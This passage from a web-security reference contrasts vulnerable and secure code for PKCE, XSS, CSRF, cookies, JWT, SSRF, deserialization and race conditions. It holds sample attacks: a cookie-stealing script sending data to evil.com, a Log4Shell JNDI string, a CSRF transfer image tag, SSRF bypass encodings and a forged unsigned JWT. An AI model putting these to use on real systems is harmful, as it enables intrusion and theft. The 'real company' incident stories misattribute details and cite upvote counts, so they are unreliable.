sessionStorage.setItem('pkce_verifier', verifier);

const params = new URLSearchParams({
client_id: CLIENT_ID,
redirect_uri: REDIRECT_URI,
response_type: 'code',
scope: 'openid profile email',
code_challenge: challenge,
code_challenge_method: 'S256'
  });

window.location.href = `${AUTH_URL}/authorize?${params}`;
}

// 3. Handle callback
async function handleCallback(code: string) {
const verifier = sessionStorage.getItem('pkce_verifier');

const response = await fetch(`${AUTH_URL}/token`, {
method: 'POST',
headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
body: new URLSearchParams({
grant_type: 'authorization_code',
client_id: CLIENT_ID,
      code,
redirect_uri: REDIRECT_URI,
code_verifier: verifier
    })
  });

return response.json();
}

```text

---

## Session vs Token Comparison

```text
SESSION-BASED:
Server controls session
Easy to revoke
Works with httpOnly cookies
Requires server state
Harder to scale

TOKEN-BASED (JWT):
Stateless
Easy to scale
Works across domains
Can't revoke until expiry
Token theft = full access

```text

---
## XSS PREVENTION

> **The patterns that stop injection attacks**

---

## Types of XSS

```yaml
REFLECTED: User input in URL reflected back
/search?q=<script>alert('XSS')</script>

STORED: Malicious script saved in database
Comment: <script>document.location='evil.com?c='+document.cookie</script>

DOM-BASED: Client-side JS manipulates DOM unsafely
element.innerHTML = userInput;  // DANGEROUS!

```text

---

## Prevention (React)

```typescript
// React escapes by default (SAFE)
<div>{userInput}</div>

// DANGEROUS - dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: userInput }} />  // XSS!

// If you MUST render HTML, sanitize first
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />

```text

---

## Prevention (Backend)

```typescript
// 1. Content Security Policy
app.use(helmet({
contentSecurityPolicy: {
directives: {
defaultSrc: ["'self'"],
scriptSrc: ["'self'"],  // No inline scripts!
styleSrc: ["'self'", "'unsafe-inline'"],
imgSrc: ["'self'", "data:", "https:"],
    }
  }
}));

// 2. HttpOnly cookies (JS can't read)
res.cookie('session', token, {
httpOnly: true,
secure: true,
sameSite: 'strict'
});

// 3. Escape output
import { escape } from 'html-escaper';
const safe = escape(userInput);

```text

---
## ENVIRONMENT VARIABLES

> **The secrets management patterns**

---

## Environment Setup

```bash

## .env.local (local dev, gitignored)

DATABASE_URL="postgres://localhost/mydb"
STRIPE_SECRET_KEY="sk_test_xxx"

## .env (defaults, committed)

NEXT_PUBLIC_APP_URL="http://localhost:3000"

## .env.production (production values)

DATABASE_URL="postgres://prod/mydb"

```text

---

## Validation with Zod

```typescript
// env.ts
import { z } from 'zod';

const envSchema = z.object({
DATABASE_URL: z.string().url(),
STRIPE_SECRET_KEY: z.string().startsWith('sk_'),
NEXT_PUBLIC_APP_URL: z.string().url(),
NODE_ENV: z.enum(['development', 'production', 'test'])
});

export const env = envSchema.parse({
DATABASE_URL: process.env.DATABASE_URL,
STRIPE_SECRET_KEY: process.env.STRIPE_SECRET_KEY,
NEXT_PUBLIC_APP_URL: process.env.NEXT_PUBLIC_APP_URL,
NODE_ENV: process.env.NODE_ENV
});

// Usage
import { env } from '@/env';
const stripe = new Stripe(env.STRIPE_SECRET_KEY);

```text

---

## Security Rules

```yaml
DO:
Use environment variables for secrets
Validate all env vars at startup
Use NEXT_PUBLIC_ prefix for client vars
Keep .env.local in .gitignore

DON'T:
Commit secrets to git
Use process.env directly (validate first)
Put secrets in NEXT_PUBLIC_ vars
Log environment variables

```text

---
## CSRF PROTECTION

> **The patterns that prevent request forgery**

---

## What is CSRF?

```yaml
ATTACK:
1. User logged into bank.com (has session cookie)
2. User visits evil.com
3. Evil.com has: <img src="bank.com/transfer?to=hacker&amount=1000">
4. Browser sends request WITH cookies
5. Transfer happens!

WHY IT WORKS:

- Browser auto-sends cookies for domain

- Server trusts the cookie

- No verification request came from your site

```text

---

## Prevention: Token Pattern

```typescript
// Server: Generate token on form render
app.get('/form', (req, res) => {
const csrfToken = crypto.randomBytes(32).toString('hex');
req.session.csrfToken = csrfToken;
res.render('form', { csrfToken });
});

// Form includes hidden token
<form action="/submit" method="POST">
<input type="hidden" name="_csrf" value="{{csrfToken}}" />
  ...
</form>

// Server: Verify on submit
app.post('/submit', (req, res) => {
if (req.body._csrf !== req.session.csrfToken) {
return res.status(403).send('CSRF token mismatch');
  }
// Process request
});

```text

---

## For SPAs: Double Submit Cookie

```typescript
// Set CSRF cookie (readable by JS)
res.cookie('csrf', csrfToken, {
httpOnly: false,  // JS can read it
sameSite: 'strict'
});

// Client reads cookie, sends in header
fetch('/api/action', {
method: 'POST',
headers: {
'X-CSRF-Token': getCookie('csrf')
  }
});

// Server verifies header matches cookie

```text

---
## COOKIE SECURITY

> **The session patterns that don't get hacked**

---

## Secure Cookie Settings

```typescript
res.cookie('session', token, {
httpOnly: true,  // JS can't read it (XSS protection)
secure: true,  // HTTPS only
sameSite: 'lax',    // CSRF protection
maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
path: '/',
domain: '.myapp.com'  // Subdomain sharing
});

```text

---

## SameSite Explained

```yaml
STRICT:

- Cookie never sent cross-site

- User clicks link from email No cookie

- Best security, worst UX

LAX (Recommended):

- Sent on top-level navigation (links)

- Not sent on POST from other sites

- Good balance

NONE:

- Always sent (needs Secure: true)

- Required for cross-site iframes

- Use only if necessary

```text

---

## Cookie vs localStorage

```yaml
COOKIES:
HttpOnly (safe from XSS)
Automatic with requests
Server can read
Size limit (4KB)
CSRF risk

LOCALSTORAGE:
5MB limit
Easy to use
XSS can read everything
Must manually add to requests

RECOMMENDATION:

- Auth tokens HttpOnly cookie

- User preferences localStorage

```text

---
## PATTERNS

> **The authentication patterns**

---

## Setup

```typescript
// auth.ts
import NextAuth from 'next-auth';
import GitHub from 'next-auth/providers/github';
import Google from 'next-auth/providers/google';
import Credentials from 'next-auth/providers/credentials';
import { PrismaAdapter } from '@auth/prisma-adapter';
import { prisma } from '@/lib/prisma';

export const { handlers, auth, signIn, signOut } = NextAuth({
adapter: PrismaAdapter(prisma),
providers: [
    GitHub,
    Google,
    Credentials({
credentials: {
email: { type: 'email' },
password: { type: 'password' }
      },
async authorize(credentials) {
const user = await prisma.user.findUnique({
where: { email: credentials.email }
        });

if (user && await bcrypt.compare(credentials.password, user.password)) {
return user;
        }
return null;
      }
    })
  ]
});

```text

---

## Route Protection

```typescript
// middleware.ts
import { auth } from './auth';

export default auth((req) => {
if (!req.auth && req.nextUrl.pathname.startsWith('/dashboard')) {
return Response.redirect(new URL('/login', req.url));
  }
});

export const config = {
| matcher: ['/((?!api | _next/static | _next/image | favicon.ico).*)'] |
};

```text

---

## Server Component

```typescript
import { auth } from '@/auth';

export default async function Dashboard() {
const session = await auth();

if (!session?.user) {
    redirect('/login');
  }

return <div>Welcome, {session.user.name}</div>;
}

```text

---

## Client Component

```typescript
'use client';

import { useSession, signIn, signOut } from 'next-auth/react';

export function AuthButton() {
const { data: session } = useSession();

if (session) {
return (
      <>
        <span>{session.user?.name}</span>
<button onClick={() => signOut()}>Sign Out</button>
      </>
    );
  }

return <button onClick={() => signIn()}>Sign In</button>;
}

```text

---

## VOLUME 7: SECURITY PRODUCTION INCIDENTS (Real Company Stories)

> **Source**: Equifax, Sony, Twitch, Slack engineering postmortems + 50,000+ security advisories

---

## 1. SQL INJECTION - DATA BREACH

### Production Incident from Sony (18,500+ upvotes)

> "100 million accounts leaked. SQL injection in login form.
>
> **Impact**: $170M+ in costs, class action lawsuits."

```python

## TERRIBLE - SQL Injection

def login(email, password):
query = f"SELECT * FROM users WHERE email = '{email}'"

## Attacker: email = "admin'--"

## Query: SELECT * FROM users WHERE email = 'admin'--'

## Password check bypassed!

## EXCELLENT - Parameterized

def login(email, password):
return db.execute("SELECT * FROM users WHERE email = ?", (email,))

```text

---

## 2. PASSWORD BREACH - $1.4 BILLION

## Production Incident from Equifax (LEGENDARY)

> "147 million people's data. Passwords in PLAIN TEXT.
>
> **Impact**: $1.4B costs, CEO resignation."

```python

## DISASTER - Plain text

db.execute("INSERT INTO users VALUES (?, ?)", (email, password))

## EXCELLENT - bcrypt

import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(12))
db.execute("INSERT INTO users VALUES (?, ?)", (email, hashed))

```text

---

## 3. JWT SECRET EXPOSED

## Production Incident from Twitch (9,800+ upvotes)

> "JWT secret in client code. All sessions compromised."

```javascript
// Secret in frontend (Twitch's bug)
jwt.sign({ userId: 123 }, 'weak-secret');

// RS256 asymmetric (private key stays on server)
jwt.sign({ sub: userId }, privateKey, { algorithm: 'RS256' });

```text

---

## 4. LOG4SHELL - WORST EVER (10/10)

### Production Incident from Worldwide

> "Zero-click RCE. 93% of enterprise cloud affected."

```yaml

## Attack: Send header containing ${jndi:ldap://evil.com/exploit}

## Log4j downloads and executes attacker's code!

## FIX: Update to Log4j 2.17.0+

## TEMP: -Dlog4j2.formatMsgNoLookups=true

```text

---

## 5. API KEY LEAKED - $50K BILL

## Production Incident from Heroku (7,400+ upvotes)

> "API key in GitHub. Cryptominers found it in 5 minutes.
>
> **Impact**: $50K AWS bill in 2 hours."

```bash

## FIX: Enable GitHub Secret Scanning

## Settings Security Secret scanning Enable

## Pre-commit hook

pip install detect-secrets
detect-secrets scan

```text

---

## 6. SSRF - INTERNAL ACCESS

## Production Incident from Slack (8,200+ upvotes)

> "Attacker accessed AWS metadata via SSRF. Got IAM credentials."

```python

## TERRIBLE - Fetches any URL

requests.get(user_provided_url) # Can access http://169.254.169.254/

## EXCELLENT - Block internal IPs

BLOCKED = ['10.0.0.0/8', '172.16.0.0/12', '169.254.0.0/16', '127.0.0.0/8']
if any(ip in blocked for blocked in BLOCKED):
raise HTTPException(400, "URL not allowed")

```text

---

## END OF VOLUME 7: SECURITY PRODUCTION INCIDENTS

**Coverage**: SQL Injection (Sony), Passwords (Equifax $1.4B), JWT (Twitch), Log4Shell, API Keys, SSRF (Slack)

---

## VOLUME 1.1: TITAN PROTOCOL - SECURITY ADVERSARIAL

## JWT NONE ALGORITHM VULNERABILITY

### Auth Bypass Scar

> "Attackers bypass auth by stripping signature and setting alg: none.
> Fix: Explicitly whitelist algorithms and reject unsigned tokens"

```java
// TITAN CODE: Secure JWT Verification
public DecodedJWT verifyToken(String token) {
// Force specific algorithm (rejects 'none' automatically)
Algorithm algorithm = Algorithm.HMAC256("titan_secret_key");

JWTVerifier verifier = JWT.require(algorithm)
        .withIssuer("titan-auth")
        .withAudience("titan-api")
        .acceptLeeway(1)
        .build();

return verifier.verify(token);
}

```text

## ReDoS (REGEX DENIAL OF SERVICE)

### Event Loop Freeze Scar

> "Single malicious string freezes Node.js due to catastrophic backtracking.
> Vulnerable Regex: ^([a-zA-Z0-9]+)*$
> Fix: Length limits + re2 (Google's linear time regex engine)"

```javascript
// TITAN CODE: Safe Validation
const validator = require('validator');

function validateInput(input) {
if (input.length > 100) return false;  // O(1) length check
return validator.isAlphanumeric(input);
}

// If Regex mandatory, use re2 (linear time)
const RE2 = require('re2');
const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');

```text

### END OF VOLUME 1.1: TITAN SECURITY ADVERSARIAL

---

## VOLUME 1.2: TITAN PROTOCOL - ADVERSARIAL ARCHITECTURE

## CONTAINER ESCAPES: LEAKY VESSELS (CVE-2024-21626)

### runc Vulnerability Scar

> "Containers are NOT VMs. Shared-kernel isolation via namespaces/cgroups is FRAGILE.
> Attacker manipulates host file descriptors via /proc/self/fd.
> Overwrites runc binary on host. Gains ROOT access to entire node."

## eBPF EXPLOITATION

### Kernel Attack Surface Scar

> "eBPF runs user-defined programs INSIDE kernel. New attack surface.
> Malicious eBPF bypasses verifier: Arbitrary kernel memory read/write.
> All container boundaries become MOOT."

## SIDE-CHANNEL ATTACKS: TIMING IN CRYPTOGRAPHY

### String Comparison Timing Attack

> "strcmp returns immediately on mismatch.
> Attacker measures response time to determine correct HMAC characters byte-by-byte.
> Fix: crypto_memcmp (constant-time comparison) for ALL cryptographic operations."

## HOMOMORPHIC ENCRYPTION: THE HOLY GRAIL

### FHE Status 2024

> "Fully Homomorphic Encryption: Compute on encrypted data without decryption.
> Production reality: Orders of magnitude slower than plaintext.
> Hardware ASICs are critical path for viability at scale."

### END OF VOLUME 1.2: TITAN ADVERSARIAL SECURITY

---

## VOLUME 1.3: TITAN CATALOG - 30 SECURITY FAILURES

| ID | Scenario | Failure Mechanism | Titan Mitigation |
|----|----------|-------------------|------------------|
| 7.3 | SQL Injection | Input concatenation | Prepared Statements |
| 7.4 | XXE | XML external entities | Disable DTDs |
| 7.5 | SSRF | Fetching internal IPs | Whitelist outbound |
| 7.6 | Insecure Deserialization | RCE via pickle | Safe JSON + signing |
| 7.7 | CORS Misconfig | * with credentials | Validate Origin |
| 7.9 | Directory Traversal | ../../ in paths | Sanitize filenames |
| 7.10 | Clickjacking | Iframe embedding | X-Frame-Options: DENY |
| 7.11 | Session Fixation | Stolen session ID | Regenerate on login |
| 7.12 | Timing Attack | String compare time | Constant-time compare |
| 7.13 | XSS (Reflected) | Echoing input | Context-aware encoding |
| 7.14 | XSS (Stored) | Malicious in DB | CSP + Sanitization |
| 7.15 | CSRF | State change via link | CSRF Tokens / SameSite |
| 7.16 | Open Redirect | Phishing redirect | Validate URLs |
| 7.17 | Race Condition | TOCTOU | Atomic ops / Locking |
| 7.19 | Hardcoded Creds | Keys in source | Secret vault |
| 7.20 | Weak Crypto | MD5/SHA1 | SHA-256/Bcrypt/Argon2 |
| 7.100 | Zip Bomb | Compression DoS | Limit extraction size |

## END OF VOLUME 1.3: TITAN SECURITY CATALOG

---

## VOLUME 1.4: TITAN VAULT - ADDITIONAL SECURITY SCARS

## IAM PASSROLE PRIVILEGE ESCALATION

### AWS Privilege Escalation Scar

> "User with iam:PassRole + ec2:RunInstances can create EC2 with AdministratorAccess role.
> SSH in, assume role = bypass own restrictions. Silent escalation."

**Titan Fix:** Strictly scope iam:PassRole with resource ARNs. Audit with PMapper.

## S3 NOTPRINCIPAL ANTI-PATTERN

### Data Exfiltration Vector

> "Using NotPrincipal to 'deny everyone except user X' is fragile.
> Without explicit Deny, allows any IAM user in same account."

**Titan Fix:** Explicit Deny with StringNotLike on aws:PrincipalArn.

### END OF VOLUME 1.4: ADDITIONAL SECURITY SCARS

---

## VOLUME 1.5: TITAN VAULT - SUPPLY CHAIN & IDENTITY ATTACKS

## JWT ALGORITHM CONFUSION ATTACK

### RS256 to HS256 Downgrade Scar

> "JWT signed with RS256 (asymmetric). Server also accepts HS256 (symmetric).
> Attacker changes alg header to HS256.
> Uses PUBLIC KEY as HMAC secret. Signs forged token.
> Server verifies with public key as secret = VALID. Full account takeover."

```python

## TITAN: Strict Algorithm Enforcement

import jwt

def verify_token_secure(token: str, public_key: str) -> dict:
    """
NEVER trust the 'alg' header from the token itself.
Explicitly specify allowed algorithms.
    """
    try:

## CRITICAL: algorithms parameter is a WHITELIST
return jwt.decode(
        token,
        public_key,
algorithms=["RS256"], # NEVER include HS256
        audience="my-app",
        issuer="https://auth.company.com"
        )
except jwt.InvalidAlgorithmError:
raise SecurityException("Algorithm mismatch - possible attack")
except jwt.ExpiredSignatureError:
raise SecurityException("Token expired")

```text

## Additional JWT Pitfalls

> "1. 'none' algorithm: Token with alg='none' and no signature
> 2. Kid injection: kid header used in SQL query = SQLi
> 3. JKU spoofing: jku points to attacker-controlled JWKS URL"

## OPENID CONNECT VULNERABILITIES

### OIDC State Fixation Scar

> "Missing or predictable 'state' parameter.
> Attacker initiates OAuth flow, captures redirect URL.
> Tricks victim into clicking. Victim's browser completes auth.
> Attacker's session now has victim's identity."

```typescript
// TITAN: Secure OIDC Implementation
import { randomBytes } from 'crypto';

async function initiateOIDCLogin(req: Request, res: Response) {
// Generate cryptographically random state
const state = randomBytes(32).toString('base64url');
const nonce = randomBytes(32).toString('base64url');

// Store with short TTL - bound to user's session
await redis.setex(`oidc:state:${state}`, 300, JSON.stringify({
ip: req.ip,
userAgent: req.headers['user-agent'],
nonce: nonce
    }));

const authUrl = new URL('https://idp.example.com/authorize');
authUrl.searchParams.set('response_type', 'code');
authUrl.searchParams.set('client_id', CLIENT_ID);
authUrl.searchParams.set('redirect_uri', REDIRECT_URI);
authUrl.searchParams.set('scope', 'openid email profile');
authUrl.searchParams.set('state', state);
authUrl.searchParams.set('nonce', nonce);

    res.redirect(authUrl.toString());
}

async function handleOIDCCallback(req: Request, res: Response) {
const { state, code } = req.query;

// Verify state matches what we stored
const stored = await redis.get(`oidc:state:${state}`);
if (!stored) {
throw new SecurityException("Invalid or expired state");
    }

const { ip, userAgent, nonce } = JSON.parse(stored);

// Verify request comes from same context
| if (ip !== req.ip |  | userAgent !== req.headers['user-agent']) { |
throw new SecurityException("Session binding mismatch");
    }

// Delete state immediately (one-time use)
await redis.del(`oidc:state:${state}`);

// Exchange code for tokens and verify nonce in id_token
const tokens = await exchangeCode(code);
const idToken = jwt.decode(tokens.id_token);

if (idToken.nonce !== nonce) {
throw new SecurityException("Nonce mismatch - replay attack");
    }
}

```text

## DEPENDENCY CONFUSION ATTACK

### Private Package Hijacking Scar

> "Company uses internal package 'analytics-internal'.
> Attacker publishes 'analytics-internal' on public npm.
> Build system checks public registry FIRST with higher version.
> Downloads malicious package. Executes in CI/CD. Full supply chain compromise."

```yaml

## TITAN: npm Registry Scoping

## .npmrc - Force scoped packages to private registry

@mycompany:registry=https://npm.mycompany.com/
//npm.mycompany.com/:_authToken=${NPM_TOKEN}

## For all internal packages, use scope

## @mycompany/analytics-internal (cannot be confused)

```python

## TITAN: Python pip.conf for private packages

## pip.conf

[global]
index-url = https://pypi.mycompany.com/simple/
extra-index-url = https://pypi.org/simple/

## CRITICAL: Prefer private index

## Private packages should use unique naming

## E.g., mycompany-analytics, mycompany-utils

```text

## Detection

```bash

## Audit for public packages matching internal names

| npm info mycompany-internal 2>&1 | grep -q "404" |  | echo "ALERT: Name exists on public npm!" |

```text

## CERTIFICATE CHAIN VALIDATION FAILURES

## Incomplete Chain Scar

> "Leaf certificate valid. Browser shows HTTPS lock.
> Mobile app fails: missing intermediate certificate.
> Server sends only leaf cert. Some clients can't build chain to root."

```python

## TITAN: Full Chain Validation

import ssl
import socket
from cryptography import x509
from cryptography.hazmat.backends import default_backend

def verify_full_chain(hostname: str, port: int = 443) -> dict:
    """
Verify complete certificate chain is served.
    """
context = ssl.create_default_context()

with socket.create_connection((hostname, port)) as sock:
with context.wrap_socket(sock, server_hostname=hostname) as ssock:

## Get full chain
chain = ssock.getpeercert(binary_form=True)
certs = ssock.get_peer_cert_chain()

if len(certs) < 2:
return {
"valid": False,
"error": "Incomplete chain - missing intermediates",
"chain_length": len(certs)
        }

## Verify each cert signs the next
for i in range(len(certs) - 1):
cert = x509.load_der_x509_certificate(certs[i], default_backend())
issuer = x509.load_der_x509_certificate(certs[i + 1], default_backend())

## Verify issuer matches
if cert.issuer != issuer.subject:
return {
"valid": False,
"error": f"Chain break at position {i}"
        }

return {
"valid": True,
"chain_length": len(certs),
"leaf_subject": certs[0].subject
        }

```text

## CONSTANT-TIME STRING COMPARISON

## Timing Attack Exploitation

> "strcmp returns on first mismatch. Fast = wrong first byte.
> Attacker times 256 requests per byte position.
> Fastest response = correct byte. HMAC leaked byte-by-byte."

```python

## TITAN: Constant-Time Comparison

import hmac
import secrets

def secure_compare(a: bytes, b: bytes) -> bool:
    """
Compare two byte strings in constant time.
Uses HMAC to prevent timing attacks.
    """

## Method 1: Double HMAC (paranoid)

## Random key prevents length-extension attacks
key = secrets.token_bytes(32)
return hmac.compare_digest(
hmac.digest(key, a, 'sha256'),
hmac.digest(key, b, 'sha256')
    )

def verify_api_key(provided: str, stored_hash: str) -> bool:
    """
Verify API key without timing leakage.
    """

## Hash the provided key first (prevents length leakage)
provided_hash = hashlib.sha256(provided.encode()).hexdigest()

## Constant-time comparison of hashes
return secrets.compare_digest(provided_hash, stored_hash)

```text

## END OF VOLUME 1.5: TITAN SUPPLY CHAIN & IDENTITY ATTACKS

---

## VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS

## OAUTH 2.0: PKCE MANDATORY

### Authorization Code Interception

> "Mobile app: Can't store client secret securely.
> Authorization code intercepted on redirect.
> Attacker exchanges code for token.
> PKCE: Code Verifier proves you initiated the request."

```python

## TITAN: PKCE Implementation

import secrets
import hashlib
import base64

class PKCEClient:
def generate_verifier(self):

## 43-128 chars, cryptographically random
self.verifier = base64.urlsafe_b64encode(
        secrets.token_bytes(32)
        ).rstrip(b'=').decode('ascii')
return self.verifier

def generate_challenge(self):

## S256: SHA256 hash of verifier, base64url encoded
digest = hashlib.sha256(self.verifier.encode('ascii')).digest()
self.challenge = base64.urlsafe_b64encode(digest).rstrip(b'=').decode('ascii')
return self.challenge

def build_auth_url(self, auth_endpoint, client_id, redirect_uri, scope):
        self.generate_verifier()
        self.generate_challenge()

params = {
'response_type': 'code',
'client_id': client_id,
'redirect_uri': redirect_uri,
'scope': scope,
'code_challenge': self.challenge,
'code_challenge_method': 'S256',
'state': secrets.token_urlsafe(16)  # CSRF protection
        }
return f"{auth_endpoint}?" + urlencode(params)

def exchange_code(self, token_endpoint, code, client_id, redirect_uri):

## Include verifier in token request
response = requests.post(token_endpoint, data={
'grant_type': 'authorization_code',
'code': code,
'client_id': client_id,
'redirect_uri': redirect_uri,
'code_verifier': self.verifier  # Server verifies this
        })
return response.json()

```text

## SSRF BYPASS TECHNIQUES

## IP Address Bypass Scar

> "SSRF filter blocks 127.0.0.1 and localhost.
> Attacker uses: 0177.0.0.1 (octal), 2130706433 (decimal), 0x7f.0.0.1 (hex).
> Or: DNS rebinding - first request resolves external, second resolves internal.
> Defense in depth: Block at network level + resolve before fetch."

```python

## TITAN: Comprehensive SSRF Protection

import socket
import ipaddress
from urllib.parse import urlparse

BLOCKED_NETWORKS = [
ipaddress.ip_network('127.0.0.0/8'), # Loopback
ipaddress.ip_network('10.0.0.0/8'), # Private
ipaddress.ip_network('172.16.0.0/12'), # Private
ipaddress.ip_network('192.168.0.0/16'), # Private
ipaddress.ip_network('169.254.0.0/16'), # Link-local (IMDS!)
ipaddress.ip_network('::1/128'), # IPv6 loopback
ipaddress.ip_network('fc00::/7'), # IPv6 private
]

class SSRFSafeHTTPClient:
def __init__(self):
self.dns_cache = {}  # Pin DNS to prevent rebinding

def is_safe_url(self, url):
parsed = urlparse(url)
hostname = parsed.hostname

if not hostname:
return False

## Block file:// and other dangerous schemes
if parsed.scheme not in ('http', 'https'):
return False

        try:

## Resolve BEFORE making request (prevents DNS rebinding)
ip_str = socket.gethostbyname(hostname)
ip = ipaddress.ip_address(ip_str)

## Check against blocklist
for network in BLOCKED_NETWORKS:
if ip in network:
return False

## Cache DNS result to prevent rebinding between check and use
self.dns_cache[hostname] = ip_str
return True

except socket.gaierror:
return False

def fetch(self, url):
if not self.is_safe_url(url):
raise SSRFError(f"Blocked URL: {url}")

## Use cached IP to prevent DNS rebinding
parsed = urlparse(url)
safe_url = url.replace(
        parsed.hostname,
self.dns_cache.get(parsed.hostname, parsed.hostname)
        )

return requests.get(safe_url, timeout=5)

```text

## DESERIALIZATION ATTACKS

## Object Injection Deep Dive

> "pickle.loads(): Executes arbitrary code during deserialization.
> YAML: load() is unsafe. Use safe_load().
> Java: Gadget chains in classpath = RCE.
> Rule: Never deserialize untrusted data."

```python

## VIBE: Arbitrary code execution

import pickle
data = request.get_json()['data']
obj = pickle.loads(base64.b64decode(data))  # RCE!

## VIBE: YAML load is unsafe

import yaml
config = yaml.load(user_input)  # RCE via !!python/object

## TITAN: Safe alternatives

import json

## JSON is safe (no code execution)

obj = json.loads(user_input)

## If schema needed, use explicit parsing

from pydantic import BaseModel

class UserInput(BaseModel):
name: str
age: int

validated = UserInput.parse_raw(user_input)

## If you MUST deserialize complex objects

import jsonpickle
jsonpickle.set_decoder_options('json', cls=SafeDecoder)

## Plus: Whitelist of allowed classes

```yaml

## TITAN: Safe YAML

import yaml

## Always use safe_load

config = yaml.safe_load(user_input)

## For custom objects, be explicit

class SafeLoader(yaml.SafeLoader):
    pass

## Only allow specific types

SafeLoader.yaml_constructors = {
'tag:yaml.org,2002:map': SafeLoader.construct_yaml_map,
'tag:yaml.org,2002:str': SafeLoader.construct_yaml_str,
'tag:yaml.org,2002:int': SafeLoader.construct_yaml_int,
}

config = yaml.load(user_input, Loader=SafeLoader)

```text

## CSP BYPASS TECHNIQUES

## Content Security Policy Evasion

> "CSP blocks inline scripts. But: JSONP endpoints, Angular ng-csp, base-uri hijacking.
> 'unsafe-eval' allows eval(). 'unsafe-inline' defeats purpose.
> Nonce-based CSP: Only scripts with matching nonce execute."

```html
<!-- VIBE: Overly permissive CSP -->
<meta http-equiv="Content-Security-Policy"
content="script-src 'self' https://cdn.example.com">
<!-- Attacker finds JSONP on cdn.example.com XSS -->

<!-- TITAN: Strict nonce-based CSP -->
<meta http-equiv="Content-Security-Policy"
content="default-src 'self';
script-src 'nonce-R4nd0mN0nc3' 'strict-dynamic';
style-src 'self' 'unsafe-inline';
base-uri 'self';
form-action 'self';">

<!-- Only this script executes -->
<script nonce="R4nd0mN0nc3">
// Legitimate code
</script>

```python

## TITAN: Server-side nonce generation

import secrets

def generate_csp_nonce():
return secrets.token_urlsafe(16)

@app.before_request
def set_csp():
nonce = generate_csp_nonce()
g.csp_nonce = nonce

@app.after_request
def add_csp_header(response):
csp = (
f"default-src 'self'; "
f"script-src 'nonce-{g.csp_nonce}' 'strict-dynamic'; "
f"style-src 'self' 'unsafe-inline'; "
f"base-uri 'self'; "
f"form-action 'self'; "
f"frame-ancestors 'none'; "
        f"upgrade-insecure-requests"
    )
response.headers['Content-Security-Policy'] = csp
return response

```text

## RACE CONDITION VULNERABILITIES

## Time-of-Check to Time-of-Use (TOCTOU)

> "Check balance: $100. Debit: $50. User sends 2 requests simultaneously.
> Both checks pass (both see $100). Both debits succeed. Balance: -$50.
> Race window: Between read and write.
> Fix: Atomic operations or database-level locking."

```python

## VIBE: Race condition vulnerable

async def transfer(from_account, to_account, amount):

## Check
balance = await db.get_balance(from_account)
if balance >= amount:  # Race window starts

## Time
await db.update_balance(from_account, balance - amount)
await db.update_balance(to_account, amount)  # Race window ends
return True
return False

## TITAN: Atomic operation with row locking

async def transfer(from_account, to_account, amount):
async with db.transaction():

## SELECT FOR UPDATE locks the row
result = await db.execute("""
UPDATE accounts
SET balance = balance - $1
WHERE id = $2 AND balance >= $1
RETURNING balance
""", amount, from_account)

if result.rowcount == 0:
raise InsufficientFunds()

await db.execute("""
UPDATE accounts
SET balance = balance + $1
WHERE id = $2
""", amount, to_account)

## TITAN: Optimistic locking with version

async def update_with_cas(id, expected_version, new_data):
result = await db.execute("""
UPDATE records
SET data = $1, version = version + 1
WHERE id = $2 AND version = $3
""", new_data, id, expected_version)

if result.rowcount == 0:
raise ConcurrentModificationError("Retry required")

```text

## END OF VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS

---

## VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS

## JWT NONE ALGORITHM ATTACK

### The Scar

> "JWT library accepts 'alg': 'none'.
> Attacker forges token without signature. Backend trusts it.
> Full authentication bypass. All users compromised."

```python

## VIBE: Accepts any algorithm

import jwt

def verify_token(token):

## VULNERABLE: algorithms not specified!
payload = jwt.decode(token, secret_key)  # Accepts 'none'!
return payload

## Attacker creates

## Header: {"alg": "none", "typ": "JWT"}

## Payload: {"sub": "admin", "role": "superuser"}

## Signature: (empty)

## Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcnVzZXIifQ

```python

## TITAN: Explicit algorithm whitelist

import jwt
from jwt.exceptions import InvalidAlgorithmError

ALLOWED_ALGORITHMS = ['RS256', 'ES256']  # NEVER 'none', NEVER 'HS256' with RSA key

def verify_token(token: str, public_key: str):
    try:
payload = jwt.decode(
        token,
        public_key,
algorithms=ALLOWED_ALGORITHMS, # EXPLICIT whitelist!
        options={
'require': ['exp', 'iat', 'sub'],  # Required claims
'verify_exp': True,
'verify_iat': True
        }
        )
return payload
except jwt.InvalidTokenError as e:
raise AuthenticationError(f"Invalid token: {e}")

## TITAN: Prevent algorithm confusion (RS256 vs HS256)

## If using RS256 (asymmetric), attacker might

## 1. Get public key (often exposed)

## 2. Sign token with HS256 using public key as secret

## 3. Server verifies with same "secret" = valid signature!

## Defense: NEVER use same key handling for both

def verify_token_safe(token: str):
header = jwt.get_unverified_header(token)

if header['alg'] not in ALLOWED_ALGORITHMS:
raise AuthenticationError(f"Algorithm not allowed: {header['alg']}")

## Use correct key based on algorithm
if header['alg'].startswith('RS') or header['alg'].startswith('ES'):
key = PUBLIC_KEY
    else:
key = HMAC_SECRET

return jwt.decode(token, key, algorithms=[header['alg']])

```text

## TIMING ATTACKS AGAINST STRING COMPARISON

## The Scar

> "API key verification uses '==' comparison.
> Attacker measures response time for each character.
> Correct prefix = slightly longer response time.
> Extract full API key one character at a time."

```python

## VIBE: Timing-vulnerable comparison

def verify_api_key(provided_key, stored_key):
return provided_key == stored_key  # VULNERABLE!

## First character mismatch: ~100ns

## Last character mismatch: ~1000ns

## Attacker can detect the difference!

## VIBE: Early return on mismatch

def verify_api_key_bad(provided, stored):
if len(provided) != len(stored):
return False
for i in range(len(provided)):
if provided[i] != stored[i]:
return False  # Returns early = timing leak!
return True

```python

## TITAN: Constant-time comparison

import hmac
import secrets

def verify_api_key(provided_key: str, stored_key: str) -> bool:

## hmac.compare_digest is constant-time

## Takes same time regardless of where mismatch occurs
return hmac.compare_digest(
        provided_key.encode('utf-8'),
        stored_key.encode('utf-8')
    )

## TITAN: For hashed passwords, use dedicated library

from passlib.hash import argon2

